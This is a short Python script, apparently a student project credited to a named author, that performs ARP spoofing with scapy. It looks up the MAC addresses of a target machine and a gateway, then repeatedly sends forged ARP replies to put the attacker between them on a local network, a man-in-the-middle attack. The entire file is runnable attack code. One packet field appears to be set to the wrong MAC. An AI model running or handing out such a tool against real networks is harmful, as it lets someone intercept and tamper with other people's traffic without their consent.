# /usr/bin/python3

# ARP spoofing script by Jared 2003109@sit.singaporetech.edu.sg

from scapy.all import *
from time import sleep
import argparse

MALICIOUS_MAC = "ec:f4:bb:60:3f:0a" # our MAC

def get_mac(desired_ip):
	arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=desired_ip)
	recv_packets = srp(arp_broadcast, timeout=2, verbose=0)
	return recv_packets[0][0][1].hwsrc


def do_spoof(gateway_ip, target_ip, delay, verbosity):
	GATEWAY_MAC = get_mac(gateway_ip)
	TARGET_MAC = get_mac(target_ip)

	print("Beginning ARP spoofing attack...")
	print(f"Target MAC acquired: {TARGET_MAC}")
	print(f"Gateway MAC accquired: {GATEWAY_MAC}")

	RUN = True
	while RUN:
		try:
			target_arp_spoofed = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=MALICIOUS_MAC)
			gateway_arp_spoofed = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=GATEWAY_MAC)
			send(target_arp_spoofed, verbose=verbosity)
			sleep(delay)
			send(gateway_arp_spoofed, verbose=verbosity)
			sleep(delay)
		except KeyboardInterrupt:
			print("Exiting!")
			RUN = False
	

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("target_ip", help="IP of the target machine to ARP spoof")
	parser.add_argument("gateway_ip", help="IP of the router/gateway to ARP spoof")
	parser.add_argument("--delay", help="Delay between ARP broadcasts in seconds", type=float)
	parser.add_argument("--verbosity", help="Control verbosity of ARP broadcast", type=int)
	args = parser.parse_args()

	if args.delay:
		delay = args.delay
	else:
		delay = 0.2

	if args.verbosity:
		verbosity = int(args.verbosity)
	else:
		verbosity = 0

	do_spoof(args.gateway_ip, args.target_ip, delay, verbosity)

	
	
		
